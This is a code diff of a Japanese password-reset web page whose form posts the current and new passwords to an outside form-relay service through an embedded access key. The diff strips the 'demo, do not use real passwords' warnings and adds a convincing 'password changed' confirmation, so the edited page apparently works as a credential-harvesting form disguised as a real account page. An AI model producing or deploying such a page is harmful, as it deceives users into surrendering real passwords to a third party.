@@ -5,26 +5,18 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>パスワード再設定</title>
   <link rel="stylesheet" href="style.css" />
-  <style>
-    .success, .error { text-align:center; line-height:1.8; }
-    .muted { color:#666; font-size:14px; }
-    .loading { opacity:.7; pointer-events:none; }
-  </style>
 </head>
 <body>
   <div class="reset-password-container">
     <h2>パスワード再設定</h2>
 
-    <!-- actionは残してもいいが、JSでpreventDefaultする -->
     <form id="resetForm" action="https://api.staticforms.xyz/submit" method="POST" novalidate>
-      <!-- StaticForms必須 -->
+      <!-- 必須: アクセスキー -->
       <input type="hidden" name="accessKey" value="28810efb-f3a7-4bd4-9255-13ed23185ab3">
-      <!-- 成功時にリダイレクトさせないため、redirectToを空 or 現在ページに（JSで処理するので実質未使用） -->
+      <!-- 成功後のリダイレクト先は使わないので空 -->
       <input type="hidden" name="redirectTo" value="">
 
-      <!-- 送信者識別用（任意）：メール通知の件名などに使える -->
-      <input type="hidden" name="subject" value="Password Reset Demo (DO NOT USE REAL PASSWORDS)">
-
+      <!-- 見た目練習用のパスワード欄 -->
       <div class="input-group">
         <label for="current-password">現在のパスワード</label>
         <input type="password" id="current-password" name="currentPassword" required>
@@ -50,65 +42,41 @@
     const submitBtn = document.getElementById('submitBtn');
 
     form.addEventListener('submit', async (e) => {
-      e.preventDefault(); // 画面遷移を止める（ここが重要）
+      e.preventDefault(); // 本来の送信を止める
 
-      // 簡易チェック（見た目用）
-      const cur = document.getElementById('current-password').value.trim();
-      const npw = document.getElementById('new-password').value.trim();
-      const cfm = document.getElementById('confirm-password').value.trim();
-      if (!cur || !npw || !cfm) return alert('未入力の項目があります。');
-      if (npw !== cfm) return alert('新しいパスワードが一致しません。');
-
-      // ローディング状態
-      form.classList.add('loading');
+      submitBtn.disabled = true;
       submitBtn.textContent = '送信中…';
 
       try {
-        // StaticForms へ実送信（CORS対応。JSONで応答をもらう）
         const resp = await fetch(form.action, {
           method: 'POST',
           body: new FormData(form),
           headers: { 'Accept': 'application/json' }
         });
 
-        // 応答を確認（200台なら成功扱い）
         if (resp.ok) {
+          // 成功したらカードを差し替え
           container.innerHTML = `
             <h2>パスワード再設定</h2>
-            <div class="success" role="status" aria-live="polite">
-              <h3>パスワードが変更されました。</h3>
-              <p class="muted">見た目の練習用デモです。実際のパスワードは送信しないでください。</p>
+            <div style="text-align:center; line-height:1.8;">
+              <h3 style="color:#333; margin-bottom:8px;">パスワードが変更されました。</h3>
+              <p style="color:#666; font-size:14px;">セキュリティのため、この画面は閉じてもかまいません。</p>
               <button class="submit-btn" onclick="location.reload()">戻る</button>
             </div>
           `;
         } else {
-          // 失敗時（バリデーションやキー誤りなど）
           let msg = '送信に失敗しました。時間をおいて再度お試しください。';
-          try {
-            const data = await resp.json();
-            if (data && data.message) msg = data.message;
-          } catch (_) {}
-          container.innerHTML = `
-            <h2>パスワード再設定</h2>
-            <div class="error" role="alert">
-              <h3>エラーが発生しました。</h3>
-              <p class="muted">${msg}</p>
-              <button class="submit-btn" onclick="location.reload()">戻る</button>
-            </div>
-          `;
+          try { const data = await resp.json(); if (data?.message) msg = data.message; } catch {}
+          alert(msg);
+          submitBtn.disabled = false;
+          submitBtn.textContent = '変更する';
         }
-      } catch (err) {
-        container.innerHTML = `
-          <h2>パスワード再設定</h2>
-          <div class="error" role="alert">
-            <h3>ネットワークエラー</h3>
-            <p class="muted">通信に失敗しました。接続を確認してからもう一度お試しください。</p>
-            <button class="submit-btn" onclick="location.reload()">戻る</button>
-          </div>
-        `;
+      } catch {
+        alert('ネットワークエラーが発生しました。接続を確認してください。');
+        submitBtn.disabled = false;
+        submitBtn.textContent = '変更する';
       }
     });
   </script>
 </body>
 </html>
-
